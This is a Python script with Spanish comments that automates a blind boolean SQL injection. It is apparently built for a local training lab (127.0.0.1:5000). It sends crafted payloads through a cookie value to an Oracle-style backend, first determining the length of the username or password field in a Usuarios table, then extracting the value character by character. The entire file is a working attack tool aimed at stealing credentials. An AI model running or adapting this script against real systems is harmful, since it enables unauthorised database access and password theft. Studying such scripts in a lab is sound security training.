import requests
from termcolor import colored
from yaspin import yaspin
import string
import signal
import sys
import time

# Controlar CTRL+C para una salida limpia
def signal_handler(sig, frame):
    print(colored('\n[!] Interrupción por el usuario. Saliendo...', "red"))
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Configuración del servidor
SERVER_URL = "http://127.0.0.1:5000/cookie"  # Endpoint para inyecciones booleanas

def construir_inyeccion(campo, posicion, caracter):
    """
    Construye el payload de inyección SQL.
    """
    # Escapar apóstrofes en el carácter
    caracter_escapado = caracter.replace("'", "''")
    # Construir el payload usando EXISTS y dividir por cero solo si la condición es verdadera
    payload = f"' AND EXISTS (SELECT 1 FROM Usuarios WHERE SUBSTR({campo}, {posicion}, 1) = '{caracter_escapado}' AND 1/0=0) --"
    return payload

# Enviar la inyección y verificar si se desencadenó un error
def enviar_inyeccion(payload):
    """
    Envía la inyección al servidor y devuelve True si se detecta un cambio en la web, False en caso contrario.
    Utiliza un spinner para indicar el progreso de la solicitud.
    """
    data = {
        "tipo_sqli": "blind_boolean",
        "database": "Oracle",
        "cookie_value": payload
    }

    try:
        with yaspin(text=f"[*] Enviando inyección: {payload}", color="cyan") as spinner:
            response = requests.post(SERVER_URL, json=data, timeout=5, allow_redirects=True)
            # Spinner realiza una animación mientras espera la respuesta
            spinner.ok("✔")

        # Lista de palabras clave que indican un cambio en la web
        success_keywords = ["Bienvenido de nuevo", "de nuevo"]
        for keyword in success_keywords:
            if keyword.lower() in response.text.lower():
                return True
        return False
    except requests.exceptions.Timeout:
        with yaspin(text="[!] Timeout durante la solicitud", color="red") as spinner:
            spinner.fail("✗")
        return False
    except requests.exceptions.RequestException as e:
        with yaspin(text=f"[!] Error en la petición: {e}", color="red") as spinner:
            spinner.fail("✗")
        return False

# Extraer la longitud de la cadena objetivo
def obtener_longitud(campo, max_length=100):
    """
    Determina la longitud de un campo específico en la base de datos.
    Utiliza un spinner para indicar el progreso de la determinación.
    """
    print(colored(f"\n[+] Determinando la longitud de '{campo}'...", "yellow"))
    for longitud in range(1, max_length + 1):
        # Construir el payload para verificar si LENGTH(campo) = longitud
        payload = f"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1 ELSE 1/0 END FROM Usuarios WHERE ROWNUM=1) = 1 --"
        with yaspin(text=f"Probando longitud {longitud}...", color="yellow") as spinner:
            if enviar_inyeccion(payload):
                spinner.ok("✔")
                print(colored(f"[*] La longitud de '{campo}' es: {longitud}", "green", attrs=["bold"]))
                return longitud
            else:
                spinner.fail("✗")
    print(colored(f"[!] No se pudo determinar la longitud de '{campo}' hasta el máximo de {max_length}.", "red"))
    return max_length

# Extraer el valor del campo carácter por carácter
def extraer_campo(campo, longitud):
    """
    Extrae el valor del campo especificado carácter por carácter.
    Utiliza spinners para indicar el progreso de la extracción.
    """
    resultado = ""
    # Limitar el conjunto de caracteres a probar para mayor eficiencia
    caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
    print(colored(f"\n[+] Extrayendo el valor de '{campo}'...", "yellow"))
    for pos in range(1, longitud + 1):
        encontrado = False
        print(colored(f"\n[+] Extrayendo carácter {pos} de {longitud}...", "cyan"))
        with yaspin(text=f"Probando carácter en posición {pos}...", color="cyan") as spinner:
            for caracter in caracteres:
                inyeccion = construir_inyeccion(campo, pos, caracter)
                if enviar_inyeccion(inyeccion):
                    resultado += caracter
                    spinner.text = f"[*] Carácter {pos}: '{caracter}' encontrado."
                    spinner.ok("✔")
                    print(colored(f"[*] Carácter {pos}: '{caracter}'", "green"))
                    encontrado = True
                    break
                # Opcional: Añadir un pequeño retraso para no sobrecargar el servidor
                time.sleep(0.05)
            if not encontrado:
                spinner.fail("✗")
                print(colored(f"[!] No se encontró un carácter coincidente en la posición {pos}.", "red"))
                resultado += '?'
    return resultado

# Menú interactivo
def menu():
    """
    Muestra el menú interactivo para que el usuario seleccione el campo a extraer.
    Mantiene el uso de print y input sin spinners para simplicidad.
    """
    print(colored("=== Laboratorio de Inyección SQL Blindada por Booleanos ===", "blue", attrs=["bold"]))
    print(colored("Selecciona el campo que deseas extraer:", "yellow"))
    print(colored("1. Username", "magenta"))
    print(colored("2. Password", "magenta"))

    while True:
        opcion = input("Opción (1/2): ").strip()
        if opcion == "1":
            campo = "username"  # Usar mayúsculas según tu base de datos
            break
        elif opcion == "2":
            campo = "password"  # Usar mayúsculas según tu base de datos
            break
        else:
            print(colored("[!] Introduce una opción válida (1 o 2).", "red"))

    return campo

def main():
    """
    Función principal que coordina el proceso de inyección SQL.
    """
    campo = menu()
    longitud = obtener_longitud(campo)
    if longitud == 0:
        print(colored(f"[!] No se pudo determinar la longitud de '{campo}'.", "red"))
        sys.exit(1)
    valor = extraer_campo(campo, longitud)
    print(colored(f"\n[+] El valor extraído de '{campo}': {valor}", "green", attrs=["bold"]))

if __name__ == "__main__":
    main()
